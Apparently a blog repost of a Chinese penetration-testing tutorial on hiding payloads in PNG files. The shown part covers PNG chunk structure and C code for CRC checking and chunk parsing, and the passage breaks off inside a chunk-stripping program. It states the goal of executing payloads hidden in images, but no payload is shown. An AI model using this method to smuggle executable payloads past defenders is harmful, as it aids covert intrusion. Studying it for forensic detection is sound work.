@@ -1,0 +1,398 @@
+
+<!DOCTYPE html>
+<html lang="zn-ch" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>隐写技巧——利用PNG文件格式隐藏Payload - 和音说</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="和音说,"> 
+    <meta name="description" content="流离之人追逐幻影,转载自：隐写技巧-利用PNG文件格式隐藏Payload
+其中做了添加修改
+0x00 前言
+隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG,"> 
+    <meta name="author" content="和音"> 
+    <link rel="alternative" href="atom.xml" title="和音说" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="隐写技巧——利用PNG文件格式隐藏Payload - 和音说"/>
+    <meta name="twitter:description" content="流离之人追逐幻影,转载自：隐写技巧-利用PNG文件格式隐藏Payload
+其中做了添加修改
+0x00 前言
+隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="和音说"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="隐写技巧——利用PNG文件格式隐藏Payload - 和音说"/>
+    <meta property="og:description" content="流离之人追逐幻影,转载自：隐写技巧-利用PNG文件格式隐藏Payload
+其中做了添加修改
+0x00 前言
+隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">和音说</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://glan.site"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">隐写技巧——利用PNG文件格式隐藏Payload</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">隐写技巧——利用PNG文件格式隐藏Payload</h1>
+        <div class="stuff">
+            <span>三月 30, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/png/" rel="tag">png</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E9%9A%90%E5%86%99/" rel="tag">隐写</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>转载自：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/">隐写技巧-利用PNG文件格式隐藏Payload</a></p>
+<p>其中做了添加修改</p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p>隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG的文件格式开始。 <img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/0.jpg" alt="Alt text"></p>
+<blockquote>
+<p>图片来自于<a target="_blank" rel="noopener" href="http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/">http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/</a></p>
+</blockquote>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>隐写术可以理解为信息隐藏，在渗透测试中最主要的应用是对Payload的隐藏。本文会对PNG的文件格式进行分析，编写c程序实现自动解析文件格式，并按照其文件格式添加自定义的payload，不仅不会影响图片的正常浏览，同时可将图片上传到网络，使用时将图片下载再以特定格式解密，最终执行payload。</p>
+<p><strong>注：</strong></p>
+<p>所有程序源码已上传github，地址为： <a target="_blank" rel="noopener" href="https://github.com/3gstudent/PNG-Steganography">https://github.com/3gstudent/PNG-Steganography</a></p>
+<h2 id="0x02-PNG文件格式"><a href="#0x02-PNG文件格式" class="headerlink" title="0x02 PNG文件格式"></a>0x02 PNG文件格式</h2><hr>
+<h3 id="1、PNG文件署名域"><a href="#1、PNG文件署名域" class="headerlink" title="1、PNG文件署名域"></a>1、PNG文件署名域</h3><p>前8字节</p>
+<p>固定格式，16进制为： <code>89 50 4e 47 0d 0a 1a 0a</code></p>
+<h3 id="2、数据块"><a href="#2、数据块" class="headerlink" title="2、数据块"></a>2、数据块</h3><p>Chunk Type Code(数据块类型码): 4字节,数据块类型码</p>
+<p>Chunk Data(数据块数据): 可变长度,存储数据</p>
+<p>CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码</p>
+<p><strong>数据块类型：</strong></p>
+<p><strong>1. 关键数据块(critical chunk)</strong></p>
+<p>(1) 文件头数据块IHDR(header chunk)</p>
+<ul>
+<li>包含PNG文件的基本信息</li>
+<li>一个PNG数据流中只能有一个IHDR</li>
+<li><strong>必须在PNG文件最前面</strong></li>
+</ul>
+<p>(2) 调色板数据块PLTE(palette chunk)</p>
+<ul>
+<li>包含有与索引彩色图像(indexed-color image)相关的彩色变换数据</li>
+<li><strong>必须在IDAT之前</strong></li>
+</ul>
+<p>(3) 图像数据块IDAT(image data chunk)</p>
+<ul>
+<li>存储实际的数据</li>
+<li>可存在多个</li>
+<li><strong>必须与其他IDAT连续</strong></li>
+</ul>
+<p>(4) 图像结束数据IEND(image trailer chunk)</p>
+<ul>
+<li>固定格式，16进制为： <code>00 00 00 00 49 45 4E 44 AE 42 60 82</code></li>
+<li><strong>必须在PNG文件最尾部</strong></li>
+</ul>
+<p><strong>2. 辅助数据块(ancillary chunk)</strong></p>
+<p>用于辅助指示PNG图像中的层、文字等信息</p>
+<p><strong>可删除，不影响图片浏览，但图像将失去原来的可编辑性</strong></p>
+<p>(1) 背景颜色数据块bKGD(background color)</p>
+<p>(2) 基色和白色度数据块cHRM(primary chromaticities and white point)</p>
+<p>(3) 图像γ数据块gAMA(image gamma)</p>
+<p>(4) 图像直方图数据块hIST(image histogram)</p>
+<p>(5) 物理像素尺寸数据块pHYs(physical pixel dimensions)</p>
+<p>(6) 样本有效位数据块sBIT(significant bits)</p>
+<p>(7) 文本信息数据块tEXt(textual data)</p>
+<p>(8) 图像最后修改时间数据块tIME (image last-modification time)</p>
+<p>(9) 图像透明数据块tRNS (transparency)</p>
+<p>(10) 压缩文本数据块zTXt (compressed textual data)</p>
+<h2 id="0x03-实例格式分析"><a href="#0x03-实例格式分析" class="headerlink" title="0x03 实例格式分析"></a>0x03 实例格式分析</h2><hr>
+<p>工具：<code>Hex Editor</code></p>
+<p><strong>优点：</strong></p>
+<p>可对16进制字符串进行标记，设置颜色，方便格式分析</p>
+<p><strong>测试文件：</strong></p>
+<p>如图</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/test.png" alt="Alt text"></p>
+<p><strong>源下载地址：</strong></p>
+<p><a target="_blank" rel="noopener" href="http://www.easyicon.net/language.en/1172671-png_icon.html">http://www.easyicon.net/language.en/1172671-png_icon.html</a></p>
+<p>标记好的文件格式如图</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-1.PNG" alt="Alt text"></p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-2.PNG" alt="Alt text"></p>
+<h3 id="1-PNG文件署名域"><a href="#1-PNG文件署名域" class="headerlink" title="(1) PNG文件署名域"></a>(1) PNG文件署名域</h3><p>固定格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4e 47 0d 0a 1a 0a</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-IHDR"><a href="#2-IHDR" class="headerlink" title="(2) IHDR"></a>(2) IHDR</h3><p>00000008h: 00 00 00 0D 49 48 44 52 00 00 00 1A 00 00 00 1A ; ….IHDR…….. 00000018h: 08 04 00 00 00 03 43 84 45 ; ……C凟</p>
+<p><strong>数据块结构：</strong></p>
+<p><strong>Length:</strong> <code>00 00 00 0D</code></p>
+<p>前4字节，定义长度，00 00 00 0D十进制为13，代表长度为13个字节</p>
+<p><strong>Chunk Type Code：</strong> <code>49 48 44 52</code></p>
+<p>4字节，定义数据块类型码，此处为IHDR</p>
+<p><strong>Chunk Data：</strong> <code>00 00 00 1A 00 00 00 1A 08 04 00 00 00</code></p>
+<p>共13字节，定义数据内容</p>
+<p><strong>CRC：</strong>  <code>03 43 84 45</code></p>
+<p>4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>
+<p>即对以下十六进制作计算： <code>49 48 44 52 00 00 00 1A 00 00 00 1A 08 04 00 00 00</code></p>
+<p>编写程序对CRC算法进行验证，保存为example1.cpp,源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned int GetCrc32(char* InStr,unsigned int len)&#123;        </span><br><span class="line">  unsigned int Crc32Table[256];      </span><br><span class="line">  int i,j;        </span><br><span class="line">  unsigned int Crc;        </span><br><span class="line">  for (i = 0; i &lt; 256; i++)&#123;        </span><br><span class="line">	Crc = i;        </span><br><span class="line">	for (j = 0; j &lt; 8; j++)&#123;        </span><br><span class="line">	  if (Crc &amp; 1)        </span><br><span class="line">		Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        </span><br><span class="line">	  else       </span><br><span class="line">		Crc &gt;&gt;= 1;      </span><br><span class="line">	&#125;        </span><br><span class="line">	Crc32Table[i] = Crc;        </span><br><span class="line">  &#125;        </span><br><span class="line">	</span><br><span class="line">  Crc=0xffffffff;        </span><br><span class="line">  for(int m=0; m&lt;len; m++)&#123;          </span><br><span class="line">	Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        </span><br><span class="line">  &#125;     </span><br><span class="line">	   </span><br><span class="line">  Crc ^= 0xFFFFFFFF;     </span><br><span class="line">  return Crc;        </span><br><span class="line">&#125;        </span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	char buf[17]=&#123;0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00&#125;;</span><br><span class="line">	unsigned int crc32=GetCrc32(buf,sizeof(buf));</span><br><span class="line">	printf(&quot;%08X\n&quot;,crc32);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后如图，输出<code>03438445</code>，同文件中的CRC32校验码相同</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-3.png" alt="Alt text"></p>
+<h3 id="3-gAMA"><a href="#3-gAMA" class="headerlink" title="(3) gAMA"></a>(3) gAMA</h3><p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B1 8F 0B FC 61 05 ; ….gAMA..睆.黙.</p>
+<p><strong>数据块结构：</strong></p>
+<p>Length: <code>00 00 00 04</code></p>
+<p>Chunk Type Code： <code>67 41 4D 41</code></p>
+<p>Chunk Data： <code>00 00 B1 8F</code></p>
+<p>CRC： <code>0B FC 61 05</code></p>
+<h3 id="4-cHRM"><a href="#4-cHRM" class="headerlink" title="(4) cHRM"></a>(4) cHRM</h3><p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A 26 00 00 80 84 ; … cHRM..z&amp;..€? 00000041h: 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 ; ..?..€?.u0..阘 00000051h: 00 00 3A 98 00 00 17 70 9C BA 51 3C ; ..:?..p満Q&lt;</p>
+<p><strong>数据块结构：</strong></p>
+<p>Length: <code>00 00 00 20</code></p>
+<p>Chunk Type Code： <code>63 48 52 4D</code></p>
+<p>Chunk Data： <code>00 00 7A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 98 00 00 17 70</code></p>
+<p>CRC： <code>9C BA 51 3C</code></p>
+<h3 id="5-IDAT"><a href="#5-IDAT" class="headerlink" title="(5) IDAT"></a>(5) IDAT</h3><p>(6-14) tEXt</p>
+<p>(15)IEND</p>
+<p><strong>数据块结构：</strong></p>
+<p>Length: <code>00 00 00 00</code></p>
+<p>Chunk Type Code： <code>49 45 4E 44</code></p>
+<p>Chunk Data：</p>
+<p>CRC： <code>AE 42 60 82</code></p>
+<p>固定结构，CRC的值为对Chunk Type Code作CRC32校验</p>
+<p>如图</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-4.png" alt="Alt text"></p>
+<h2 id="0x04-编写程序分析文件格式"><a href="#0x04-编写程序分析文件格式" class="headerlink" title="0x04 编写程序分析文件格式"></a>0x04 编写程序分析文件格式</h2><hr>
+<p>开发工具：<code>vc6.0</code></p>
+<h3 id="1、读取PNG文件"><a href="#1、读取PNG文件" class="headerlink" title="1、读取PNG文件"></a>1、读取PNG文件</h3><p>保存为example2.cpp，代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	FILE *fp;   </span><br><span class="line">	if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)</span><br><span class="line">		return 0;   </span><br><span class="line">	fseek(fp,0,SEEK_END);</span><br><span class="line">	int len=ftell(fp);</span><br><span class="line">	unsigned char *buf=new unsigned char[len];	</span><br><span class="line">	fseek(fp,0,SEEK_SET);</span><br><span class="line">	fread(buf,len,1,fp);</span><br><span class="line">	printf(&quot;len=%d\n&quot;,len);</span><br><span class="line">	for(int i=1;i&lt;=len;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;%02X &quot;,buf[i-1]);</span><br><span class="line">		if(i%16==0)</span><br><span class="line">			printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-5.PNG" alt="Alt text"></p>
+<h3 id="2、解析数据块结构"><a href="#2、解析数据块结构" class="headerlink" title="2、解析数据块结构"></a>2、解析数据块结构</h3><p>从第8字节开始，读前四字节为ChunkLength</p>
+<p>对应的代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsigned int ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];</span><br></pre></td></tr></table></figure>
+
+<p>接着四字节为ChunkName</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;ChunkName:%c%c%c%c\n&quot;,buf[0],buf[1],buf[2],buf[3]);</span><br></pre></td></tr></table></figure>
+
+<p>然后根据ChunkLength读出完整的ChunkData</p>
+<p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>
+<p>保存为check.cpp,完整代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned int GetCrc32(unsigned char* InStr,unsigned int len)&#123;        </span><br><span class="line">	unsigned int Crc32Table[256];      </span><br><span class="line">	unsigned int i,j;        </span><br><span class="line">	unsigned int Crc;        </span><br><span class="line">	for (i = 0; i &lt; 256; i++)&#123;        </span><br><span class="line">		Crc = i;        </span><br><span class="line">		for (j = 0; j &lt; 8; j++)&#123;        </span><br><span class="line">			if (Crc &amp; 1)        </span><br><span class="line">				Crc = (Crc &gt;&gt; 1) ^ 0xEDB88320;        </span><br><span class="line">			else       </span><br><span class="line">				Crc &gt;&gt;= 1;      </span><br><span class="line">		&#125;        </span><br><span class="line">		Crc32Table[i] = Crc;        </span><br><span class="line">	&#125;        </span><br><span class="line">	</span><br><span class="line">	Crc=0xffffffff;        </span><br><span class="line">	for(unsigned int m=0; m&lt;len; m++)&#123;          </span><br><span class="line">		Crc = (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        </span><br><span class="line">	&#125;     </span><br><span class="line">	</span><br><span class="line">	Crc ^= 0xFFFFFFFF;     </span><br><span class="line">	return Crc;        </span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	FILE *fp;   </span><br><span class="line">	unsigned char *buf=NULL;</span><br><span class="line">	unsigned int len=0;</span><br><span class="line">	unsigned int ChunkLen=0;</span><br><span class="line">	unsigned int ChunkCRC32=0;</span><br><span class="line">	unsigned int ChunkOffset=0;	</span><br><span class="line">	unsigned int crc32=0;</span><br><span class="line">	unsigned int i=0;</span><br><span class="line">	if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)</span><br><span class="line">		return 0;   </span><br><span class="line">	fseek(fp,0,SEEK_END);</span><br><span class="line">	len=ftell(fp);</span><br><span class="line">	buf=new unsigned char[len];</span><br><span class="line">	fseek(fp,0,SEEK_SET);</span><br><span class="line">	fread(buf,len,1,fp);</span><br><span class="line">	printf(&quot;Total Len=%d\n&quot;,len);</span><br><span class="line">	printf(&quot;----------------------------------------------------\n&quot;);</span><br><span class="line">	fseek(fp,8,SEEK_SET);</span><br><span class="line">	ChunkOffset=8;</span><br><span class="line">	i=0;</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">		i++;</span><br><span class="line">		memset(buf,0,len);</span><br><span class="line">		fread(buf,4,1,fp);</span><br><span class="line">		ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];</span><br><span class="line">		fread(buf,4+ChunkLen,1,fp);</span><br><span class="line">		printf(&quot;[+]ChunkName:%c%c%c%c		&quot;,buf[0],buf[1],buf[2],buf[3]);</span><br><span class="line">		if(strncmp((char *)buf,&quot;IHDR&quot;,4)==0|strncmp((char *)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)</span><br><span class="line">			printf(&quot;Palette Chunk\n&quot;);</span><br><span class="line">		printf(&quot;Ancillary Chunk\n&quot;);</span><br><span class="line">		printf(&quot;   ChunkOffset:0x%08x	\n&quot;,ChunkOffset);</span><br><span class="line">		printf(&quot;   ChunkLen: %10d		\n&quot;,ChunkLen);</span><br><span class="line">		ChunkOffset+=ChunkLen+12;</span><br><span class="line">		crc32=GetCrc32(buf,ChunkLen+4);</span><br><span class="line">		printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);</span><br><span class="line">		fread(buf,4,1,fp);</span><br><span class="line">		ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];</span><br><span class="line">		printf(&quot;   ChunkCRC32: %08X		&quot;,ChunkCRC32);</span><br><span class="line">		if(crc32!=ChunkCRC32)</span><br><span class="line">			printf(&quot;[!]CRC32Check Error!\n&quot;);</span><br><span class="line">		else</span><br><span class="line">			printf(&quot;Check Success!\n\n&quot;);</span><br><span class="line">		ChunkLen=ftell(fp);</span><br><span class="line">		if(ChunkLen==(len-12))</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;\n----------------------------------------------------\n&quot;);</span><br><span class="line">			printf(&quot;Total Chunk:%d\n&quot;,i);		</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行如图，可获得完整的PNG文件结构</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-6.PNG" alt="Alt text"></p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-7.PNG" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>
+<p>后续会补充python的实现代码</p>
+<h2 id="0x05-去除多余数据"><a href="#0x05-去除多余数据" class="headerlink" title="0x05 去除多余数据"></a>0x05 去除多余数据</h2><hr>
+<p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
+<h3 id="1、工具实现"><a href="#1、工具实现" class="headerlink" title="1、工具实现"></a>1、工具实现</h3><p>如图，使用<code>Hex Editor</code>去除辅助数据块gAMA、cHRM和bKGD</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-8.PNG" alt="Alt text"></p>
+<p>如图，文件大小变化，但不影响PNG文件浏览</p>
+<p><img src="/img/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/2-9.png" alt="Alt text"></p>
+<h3 id="2、程序实现"><a href="#2、程序实现" class="headerlink" title="2、程序实现"></a>2、程序实现</h3><p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>
+<p>保存为compress.cpp,完整代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 